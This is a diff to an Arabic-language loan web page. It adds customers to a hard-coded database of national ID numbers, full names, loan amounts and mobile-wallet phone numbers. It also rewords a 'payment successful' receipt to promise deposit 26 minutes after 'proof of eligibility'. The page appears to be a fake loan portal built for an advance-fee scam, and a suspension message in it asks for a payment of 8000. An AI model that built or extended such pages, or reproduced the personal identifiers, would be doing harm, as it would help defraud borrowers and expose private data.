@@ -299,10 +299,11 @@
 
     <script>
         // ============================================================
-        // قاعدة البيانات الجديدة (العملاء من ملف Excel الأخير + إبراهيم صلاح)
+        // قاعدة البيانات (العملاء القدامى + العملاء الجدد من ملف Excel الأخير)
         // جميع الأرقام القومية تم توحيدها إلى 14 رقمًا
         // ============================================================
         const customersDatabase = {
+            // العملاء القدامى
             "28412180102258": { name: "إبراهيم صلاح إبراهيم محمد", loan: 60000, wallet: "فودافون كاش", walletNum: "01022138111", suspended: false },
             "29006040102911": { name: "مصطفى ربيع عبد الحميد", loan: 40000, wallet: "فودافون كاش", walletNum: "01003165531", suspended: false },
             "29409010209751": { name: "انس محمد حسين محمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01009031820", suspended: false },
@@ -315,7 +316,15 @@
             "27601172501996": { name: "عصام محمود محمد محمد", loan: 45000, wallet: "فودافون كاش", walletNum: "01068860700", suspended: false },
             "28109302103752": { name: "محمود عبد الحميد محمود سلام", loan: 95000, wallet: "اتصالات كاش", walletNum: "01148688986", suspended: false },
             "28711020104618": { name: "احمد يحي احمد حافظ", loan: 200000, wallet: "فودافون كاش", walletNum: "01023677517", suspended: false },
-            "28003280200756": { name: "وليد محمد محمد عبد الغني سلامه", loan: 40000, wallet: "فودافون كاش", walletNum: "01000700925", suspended: false }
+            "28003280200756": { name: "وليد محمد محمد عبد الغني سلامه", loan: 40000, wallet: "فودافون كاش", walletNum: "01000700925", suspended: false },
+
+            // العملاء الجدد (من الملف الأخير)
+            "28205222103351": { name: "احمد محمد جمعه عبد الوهاب", loan: 200000, wallet: "اتصالات كاش", walletNum: "01153836043", suspended: false },
+            "28007241301737": { name: "عبدالحليم محمود عبدالحليم السيد", loan: 200000, wallet: "فودافون كاش", walletNum: "01008067343", suspended: false },
+            "28809272103754": { name: "محمد رياض محمد عبد التواب", loan: 55000, wallet: "فودافون كاش", walletNum: "01014068530", suspended: false },
+            "28706222101773": { name: "عبد العزيز محمد عبد العزيز", loan: 40000, wallet: "لا يوجد محفظة", walletNum: "", suspended: false },
+            "27104151701355": { name: "خليفه عبدالجليل حسن خليفه", loan: 45000, wallet: "اتصالات كاش", walletNum: "01157464906", suspended: false },
+            "28311192103437": { name: "سيد خميس احمد رمضان", loan: 200000, wallet: "اتصالات كاش", walletNum: "01126480196", suspended: false }
         };
 
         const loanDetailsMap = {
@@ -354,7 +363,7 @@
                 <div class="receipt-card">
                     <div class="receipt-header">
                         <h2><i class="fas fa-check-circle" style="color: #00F0FF;"></i> عملية دفع ناجحة</h2>
-                        <div class="receipt-badge" style="background:goldenrod; display:inline-block; padding:0.2rem 1rem; border-radius:2rem;">تم إيداع القرض</div>
+                        <div class="receipt-badge" style="background:goldenrod; display:inline-block; padding:0.2rem 1rem; border-radius:2rem;">خلال26 دقيقةمن الاثبات للجدارة ويتم إيداع القرض</div>
                     </div>
                     <div class="amount-big">
                         <div class="label">💰 قيمة التمويل المدفوع لحسابك</div>
@@ -457,7 +466,7 @@
             }, 1000);
         }
 
-        // دالة الإدانة (موجودة للتوافق مع الكود ولكن لن تستخدم لأن جميع العملاء الجدد suspended=false)
+        // دالة الإدانة (موجودة للتوافق مع الكود ولكن لن تستخدم لأن جميع العملاء suspended=false)
         function displaySuspendedMessage(customer) {
             const required = 8000;
             const msgHTML = `
@@ -495,7 +504,7 @@
                     errDiv.style.display = 'block';
                     return;
                 }
-                // جميع العملاء الجدد suspended = false
+                // جميع العملاء (قدامى وجدد) suspended = false
                 if (customer.suspended === true) {
                     displaySuspendedMessage(customer);
                 } else {
